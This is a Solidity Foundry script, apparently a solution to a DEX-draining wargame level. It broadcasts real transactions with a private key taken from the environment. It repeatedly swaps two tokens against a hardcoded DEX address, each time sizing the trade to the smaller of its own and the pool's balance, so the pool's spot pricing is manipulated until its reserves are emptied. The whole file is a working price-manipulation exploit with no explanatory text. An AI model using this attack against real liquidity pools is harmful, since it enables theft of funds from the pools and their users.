// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function balanceOf(address token, address account) external view returns (uint256);
    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract DeployAttack is Script {
    address private constant TARGET_ADDRESS = 0x9eAC51E02099AdA01FB97b3D2E4a73Ae1fa66a27;
    uint256 private constant INITIAL_ATTACKER_BALANCE = 10;
    uint256 private constant INITIAL_DEX_BALANCE = 100;
    IDex target;
    address token1;
    address token2;

    function run() public {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        target = IDex(TARGET_ADDRESS);       
        token1 = target.token1();
        token2 = target.token2();
        bool swapAtoB = false; 

        vm.startBroadcast(pk);
        while(true) {
            if(swapAtoB) {
                uint256 swapAmountOfToken2 =  findMin(token2, vm.addr(pk));
                if( swapAmountOfToken2 == 0 ){break;}
                IERC20(token2).approve(TARGET_ADDRESS, swapAmountOfToken2);
                target.swap(token2, token1, swapAmountOfToken2);
            }else{
                uint256 swapAmountOfToken1 = findMin(token1, vm.addr(pk));
                if( swapAmountOfToken1 == 0 ){break;}
                IERC20(token1).approve(TARGET_ADDRESS, swapAmountOfToken1);
                target.swap(token1, token2, swapAmountOfToken1);
            }
            swapAtoB = !swapAtoB;
        }
        vm.stopBroadcast();
    }

    function findMin(address token, address myAddr) internal view returns (uint256) {
        uint256 a = target.balanceOf(token, myAddr);   
        uint256 b = target.balanceOf(token, TARGET_ADDRESS);
        return (a > b) ? b : a;
    }
}